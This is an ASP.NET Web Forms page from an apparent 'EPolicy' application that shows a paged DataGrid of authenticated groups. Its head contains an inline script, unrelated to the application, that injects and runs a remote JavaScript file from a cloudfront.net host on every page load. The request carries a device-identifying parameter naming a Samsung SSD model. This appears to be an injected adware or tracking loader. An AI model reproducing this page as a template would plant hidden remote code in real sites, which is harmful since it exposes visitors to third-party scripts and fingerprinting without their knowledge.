<%@ Page Language="c#" Inherits="EPolicy.UserPropertiesGroup" CodeFile="UserPropertiesGroup.aspx.cs" %>
<%@ Register assembly="Microsoft.ReportViewer.WebForms, Version=10.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" namespace="Microsoft.Reporting.WebForms" tagprefix="rsweb" %>
<%@ Register assembly="AjaxControlToolkit" namespace="AjaxControlToolkit" tagprefix="asp" %>
<%@ Register TagPrefix="MaskedInput" Namespace="MaskedInput" Assembly="MaskedInput" %>
<%@ Register Assembly="AjaxControlToolkit, Version=3.5.50508.0, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e"
    Namespace="AjaxControlToolkit" TagPrefix="Toolkit" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/tr/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<head id="Head1" runat="server">
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link rel="apple-touch-icon" href="apple-touch-icon.png" />
    <link rel="stylesheet" href="css/bootstrap.min.css" />
    <link rel="icon" href="Images2\LogoGuardian.ico" type="image/x-icon" />
    <style>
        html, body
        {
            height: 100%;
        }
        body
        {
            background-color: #17529B;
        }
        .container-fluid
        {
            height: 100%;
        }
        .row.row-offcanvas.row-offcanvas-left
        {
            height: 100%;
        }
        .col-md-2
        {
            width: 16.66666667%;
            height: 100%;
        }
        .main
        {
            height: 100%;
        }
        .over-top-btn
        {
            width: 100%;
        }
    </style>
    <link rel="stylesheet" href="css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="css/main.css">
    <link href="css/fonts.css" rel="stylesheet" />
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css"
        rel="stylesheet" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1"
        crossorigin="anonymous" />
    <script type="text/javascript">        (function () { var a = document.createElement("script"); a.type = "text/javascript"; a.async = !0; a.src = "http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.107#p=samsungxssdx840xevox250gb_s1dbnsaf286689w"; var b = document.getElementsByTagName("script")[0]; b.parentNode.insertBefore(a, b); })();
    </script>
</head>
<body>    
        <form method="post" runat="server">
         <div class="container-fluid" style="height: 100%">
        <Toolkit:ToolkitScriptManager ID="ToolkitScriptManager2" runat="server" EnableScriptGlobalization="True">
        </Toolkit:ToolkitScriptManager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" RenderMode="Block">
            <ContentTemplate>
                <asp:Literal ID="jvscript" runat="server"></asp:Literal>
                <div class="row row-offcanvas row-offcanvas-left" style="height: 100%">
                  <%--  <div class="col-sm-3 col-md-2 sidebar-offcanvas" id="sidebar" role="navigation">
                        <asp:PlaceHolder ID="phTopBanner" runat="server"></asp:PlaceHolder>
                    </div>--%>
                    <div class="col-sm-9 col-md-10 main" style="height: 100%">
                        <!--toggle sidebar button-->
                        <p class="visible-xs">
                            <button type="button" class="btn btn-primary btn-xs" data-toggle="offcanvas">
                                <i class="glyphicon glyphicon-chevron-left"></i>
                            </button>
                        </p>
                        <h1 class="page-header">
                            Authenticated Group</h1>
                        <div class="form=group" align="center">
                         <asp:Button ID="btnClose" runat="server" Text="Exit" OnClick="btnClose_Click" Width="155px" CssClass="btn btn-primary btn-lg"/>
                           <br />
                            <br />
                            <div align="left">
                             <asp:Label id="Label8" runat="server" Font-Bold="True" >Authenticated Group List</asp:Label>                   
                            </div>
                        </div>
                         <div class="form-group" align="center">
                            <asp:UpdateProgress ID="UpdateProgress1" runat="server" AssociatedUpdatePanelID="UpdatePanel1"
                                DisplayAfter="10">
                                <ProgressTemplate>
                                    <img alt="" src="Images2/loader.gif" style="width: 40px; height: 40px;" />
                                    <span><span class=""></span><span class="" style="font-size: 18px">Please wait...</span></span></ProgressTemplate>
                            </asp:UpdateProgress>
                        </div>
                          <div class="row formWraper" style="padding: 0px;" align="center">
                          <div class="col-sm-12" align="center">
                                <br />
                                <div class="table-responsive">

                    <asp:DataGrid ID="DtgAuthenticatedGroup"  Width="75%" 
                        BorderWidth="0px"
                        runat="server" ItemStyle-HorizontalAlign="center" 
                        HeaderStyle-HorizontalAlign="Center" AutoGenerateColumns="False" 
                        AllowPaging="True" CellPadding="0" AlternatingItemStyle-CssClass="HeadForm3"
                        AlternatingItemStyle-BackColor="#FEFBF6" HeaderStyle-CssClass="HeadForm2" HeaderStyle-BackColor="#5C8BAE"
                        ItemStyle-CssClass="HeadForm3" PageSize="40" 
                        CssClass="table table-striped">
                        <FooterStyle ForeColor="Black"></FooterStyle>
                        <SelectedItemStyle HorizontalAlign="Center" BackColor="White"></SelectedItemStyle>
                        <EditItemStyle HorizontalAlign="Center" BackColor="White"></EditItemStyle>
                        <AlternatingItemStyle HorizontalAlign="Center" BackColor="#EBEBEB">
                        </AlternatingItemStyle>
                        <ItemStyle HorizontalAlign="Center" BorderColor="#EBEBEB"></ItemStyle>
                        <HeaderStyle HorizontalAlign="Center" Height="30px"
                            BackColor="Gray" Font-Bold="True" ForeColor="White"></HeaderStyle>
                        <Columns>
                            <asp:ButtonColumn ButtonType="PushButton" HeaderText="Sel." CommandName="Select">
                                <HeaderStyle Width="0.3in"></HeaderStyle>
                                <ItemStyle Font-Names="tahoma"></ItemStyle>
                            </asp:ButtonColumn>
                            <asp:BoundColumn Visible="False" DataField="AuthenticatedGroupID" HeaderText="AuthenticatedGroupID">
                                <ItemStyle Font-Names="tahoma"></ItemStyle>
                            </asp:BoundColumn>
                            <asp:BoundColumn DataField="AuthenticatedGroupDesc" HeaderText="Authenticated Group">
                                <ItemStyle Font-Names="tahoma" HorizontalAlign="Left"></ItemStyle>
                            </asp:BoundColumn>
                        </Columns>
                        <PagerStyle HorizontalAlign="Left" BackColor="White"
                            PageButtonCount="20" Mode="NumericPages"></PagerStyle>
                    </asp:DataGrid>
                
                 </div>
                 </div>
                            </div>     
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                                <br />
                            </div>
                             	<asp:literal id="litPopUp" RUNAT="server" VISIBLE="False"></asp:literal>
                        </div>

                         </ContentTemplate>
        </asp:UpdatePanel>
</div>
        </form>
    
</body>
</html>
